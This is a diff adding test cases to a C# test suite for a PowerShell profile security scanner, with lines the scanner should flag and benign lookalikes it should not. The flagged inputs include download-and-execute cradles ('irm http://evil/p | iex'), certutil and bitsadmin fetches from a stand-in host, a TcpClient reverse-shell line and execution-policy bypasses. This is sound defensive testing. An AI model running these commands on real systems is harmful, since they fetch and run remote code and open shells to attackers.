@@ -710,6 +710,48 @@ public class PowerShellSecurityAnalyzerTests
         Assert.Contains(reasons, r => r.Contains(expectReasonSubstring, StringComparison.OrdinalIgnoreCase));
     }
 
+    [Theory]
+    // Short web-fetch aliases (irm/iwr) - the full cmdlet names were already covered;
+    // real cradles overwhelmingly use the aliases, so a profile that fetches remote
+    // content on every shell start must trip on them too.
+    [InlineData("irm http://evil/p | iex", "irm")]
+    [InlineData("iwr http://evil/x.ps1 -OutFile $env:TEMP\\x.ps1", "iwr")]
+    // LOLBin download / decode (certutil, bitsadmin) - classic living-off-the-land fetch.
+    [InlineData("certutil -urlcache -split -f http://evil/x.exe x.exe", "certutil")]
+    [InlineData("certutil.exe -decode payload.b64 payload.exe", "certutil")]
+    [InlineData("bitsadmin /transfer job http://evil/x.exe C:\\x.exe", "bitsadmin")]
+    // Explicit WebClient object + DownloadData variant.
+    [InlineData("$c = New-Object System.Net.WebClient", "WebClient")]
+    [InlineData("(New-Object Net.WebClient).DownloadData($u)", "DownloadData")]
+    // Reverse/bind shell primitive - never legitimately in a profile.
+    [InlineData("$c = New-Object System.Net.Sockets.TcpClient('10.0.0.5',4444)", "reverse")]
+    // Inline execution-policy downgrade launched from the profile.
+    [InlineData("Start-Process powershell '-ExecutionPolicy Bypass -File x.ps1'", "execution-policy")]
+    [InlineData("powershell -ep bypass -c whoami", "execution-policy")]
+    public void ScanProfileContent_ModernAttackTokens_AreDetected(string content, string expectReasonSubstring)
+    {
+        var reasons = ScanProfileContent(content);
+        Assert.NotEmpty(reasons);
+        Assert.Contains(reasons, r => r.Contains(expectReasonSubstring, StringComparison.OrdinalIgnoreCase));
+    }
+
+    [Theory]
+    // Benign profile lines that superficially resemble the new tokens but must NOT
+    // trip (guards against over-broad substrings): a bare 'certutil -store', prose
+    // mentioning bitsadmin without '/transfer', the words 'confirm'/'stairwell' whose
+    // trailing letters spell irm/iwr (the alias tokens are URL-gated to 'irm http'/
+    // 'iwr http' precisely so ordinary English words can't false-positive), and an
+    // 'irm'/'iwr' used on a local variable rather than a URL.
+    [InlineData("certutil -store My")]                                  // cert enumeration, not -urlcache/-decode
+    [InlineData("# see bitsadmin docs for background transfers")]       // prose mentioning it, no /transfer
+    [InlineData("Write-Host 'please confirm the change'")]              // 'confirm ' ends in 'irm ' - must not match
+    [InlineData("Write-Host 'stairwell iwrench'")]                      // 'iwr' inside words, not 'iwr http'
+    [InlineData("$data = irm $localApiPath")]                           // irm of a local var, not a URL
+    public void ScanProfileContent_BenignLookalikes_AreNotFlagged(string content)
+    {
+        Assert.Empty(ScanProfileContent(content));
+    }
+
     [Fact]
     public void ScanProfileContent_NullOrBlank_IsEmpty()
     {
